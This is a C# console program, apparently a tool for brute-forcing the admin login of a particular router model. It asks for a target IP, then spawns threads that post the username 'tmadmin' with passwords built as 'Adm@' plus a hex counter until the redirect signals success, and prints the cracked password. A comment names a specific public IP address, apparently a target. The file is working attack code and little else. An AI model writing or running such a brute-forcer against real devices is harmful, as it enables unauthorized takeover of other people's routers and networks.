using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;

namespace TM_router
{
    class Program
    {
        static string target = "";
        static void Main(string[] args)
        {
            while (true)
            {
                Console.WriteLine("Target IP: ");
                target = "http://" + Console.ReadLine() + "/Forms/TM2Auth_1";
                Console.WriteLine("Thread amount (1~8): ");
                int thread_amount = int.Parse(Console.ReadLine());
                Thread[] threads = new Thread[8];
                for(int i = 0; i < thread_amount; i++)
                {
                    threads[i] = new Thread(Foo);
                    threads[i].Start();
                    threads[i].Join(1000);
                }
            }
        }

        static UInt16 count = 0;
        static bool isSuccess = false;

        async static void Foo()
        {
            var handler = new HttpClientHandler()
            {
                AllowAutoRedirect = false
            };

            HttpClient client = new HttpClient(handler);
            //FormUrlEncodedContent content;
            string success = "http://" + target + "rpSys.html";

            while (isSuccess != true)
            {
                
                string val = count.ToString("X");
                var values = new Dictionary<string, string>
                {
                    { "LoginNameValue", "tmadmin" },
                    { "LoginPasswordValue", "Adm@" + Zeroes(4-val.Length) + count.ToString("X") }
            };
                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(target, content);
                var responseString = response.Headers.Location;

                if(responseString.AbsoluteUri == success)
                {
                    isSuccess = true;
                    Console.WriteLine("Success! Password is: {0}", values["LoginPasswordValue"]);
                }
                else
                {
                    Console.WriteLine("Attempt {0} failed. TEST: {1}, RESULT: {2}", count, values["LoginPasswordValue"], responseString);
                }
                //175.144.46.41
                count++;
            }
        }

        static string Zeroes(int n)
        {
            return new String('0', n);
        }

    }
}
